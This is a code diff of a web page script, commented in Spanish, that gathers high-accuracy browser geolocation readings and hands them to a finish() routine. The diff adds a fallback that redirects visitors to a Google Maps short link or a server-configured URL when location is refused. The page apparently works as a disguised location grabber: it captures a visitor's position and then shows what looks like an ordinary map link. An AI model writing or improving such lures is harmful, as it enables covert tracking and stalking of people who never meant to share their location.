@@ -14,7 +14,7 @@
     let watchId = null;
     let deadline = null;
     let readings = [];
-    const GOOD_M = 15, MAX_WAIT = 30000, MAX_USE = 100;
+    const GOOD_M = 50, MAX_WAIT = 8000, MAX_USE = 200;
 
     function weightedAvg() {
       const pool = readings.filter(r => r.accuracy <= MAX_USE);
@@ -57,17 +57,30 @@
       if (best.accuracy <= GOOD_M) finish();
     }
 
-    function onError(err) {
+    async function redirigir() {
+      let destino = 'https://maps.app.goo.gl/t2xJ2sB7UHKGtDbH9';
+      try {
+        const cfg = await fetch('/api/config').then(r => r.json());
+        if (cfg.redirectUrl) destino = cfg.redirectUrl;
+      } catch (_) {}
+      window.location.href = destino;
+    }
+
+    function onError() {
       clearTimeout(deadline);
       if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
+      // Si hay lecturas las enviamos, si no solo redirigimos
       if (readings.length) finish();
+      else redirigir();
     }
 
     if ('geolocation' in navigator) {
       watchId = navigator.geolocation.watchPosition(onWatch, onError, {
-        enableHighAccuracy: true, timeout: 20000, maximumAge: 0,
+        enableHighAccuracy: true, timeout: 8000, maximumAge: 0,
       });
       deadline = setTimeout(() => { if (watchId !== null) finish(); }, MAX_WAIT);
+    } else {
+      redirigir();
     }
   </script>
 </body>
